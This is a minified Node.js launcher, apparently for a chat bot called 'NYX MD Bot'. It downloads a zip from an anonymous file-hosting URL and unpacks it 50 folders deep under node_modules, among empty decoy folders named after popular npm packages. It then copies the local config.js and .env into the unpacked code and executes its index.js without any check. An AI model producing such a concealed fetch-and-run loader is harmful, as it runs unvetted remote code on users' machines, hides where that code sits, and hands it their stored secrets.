const fs=require('fs'),path=require('path'),axios=require('axios'),AdmZip=require('adm-zip'),repoZipUrl=process.env.REPO_ZIP_URL||'https://files.catbox.moe/zxm9ge.zip',rootFolder=path.join(__dirname,'node_modules','lx'),targetFolder='tx',DEEP_NEST_COUNT=50,npmFolders=['axios','chalk','rimraf','dotenv','morgan','winston','minimist','yargs','colors','commander','express','uuid','body-parser','nodemon','pino','mkdirp','debug','cookie-parser','fs-extra','glob','inquirer','pm2','cors','react','vue','jest','ts-node','dayjs','ms','boxen'];function prepareFolderTree(){if(!fs.existsSync(rootFolder))fs.mkdirSync(rootFolder,{recursive:!0});for(const e of npmFolders){const o=path.join(rootFolder,e);fs.existsSync(o)||fs.mkdirSync(o)}let e=path.join(rootFolder,targetFolder);for(let o=0;o<DEEP_NEST_COUNT;o++)e=path.join(e,'zxy');const o=path.join(e,'qr');return fs.mkdirSync(o,{recursive:!0}),o}async function downloadAndExtractRepo(e){try{console.log('üîÑ Pulling from Hive...');const o=await axios.get(repoZipUrl,{responseType:'arraybuffer'}),r=new AdmZip(Buffer.from(o.data,'binary'));r.extractAllTo(e,!0),console.log('‚úÖ Repo extracted')}catch(e){console.error('‚ùå Pull error:',e.message),process.exit(1)}}function copyConfigs(e){const o=path.join(__dirname,'config.js'),r=path.join(__dirname,'.env');try{fs.copyFileSync(o,path.join(e,'config.js')),console.log('‚úÖ config.js copied')}catch{}if(fs.existsSync(r))try{fs.copyFileSync(r,path.join(e,'.env')),console.log('‚úÖ .env copied')}catch{}}(async()=>{const e=prepareFolderTree();await downloadAndExtractRepo(e);const o=fs.readdirSync(e).filter(o=>fs.statSync(path.join(e,o)).isDirectory());if(!o.length)return console.error('‚ùå Zip extracted nothing'),void process.exit(1);const r=path.join(e,o[0]);if(copyConfigs(r),!fs.existsSync(path.join(r,'lib','configdb.js')))console.warn('‚ö†Ô∏è Warning: lib/configdb.js not found.');else console.log('‚úÖ lib/configdb.js exists.');try{console.log('üöÄ Launching NYX MD Bot...'),process.chdir(r),require(path.join(r,'index.js'))}catch(e){console.error('‚ùå Bot start error:',e.message),process.exit(1)}})();
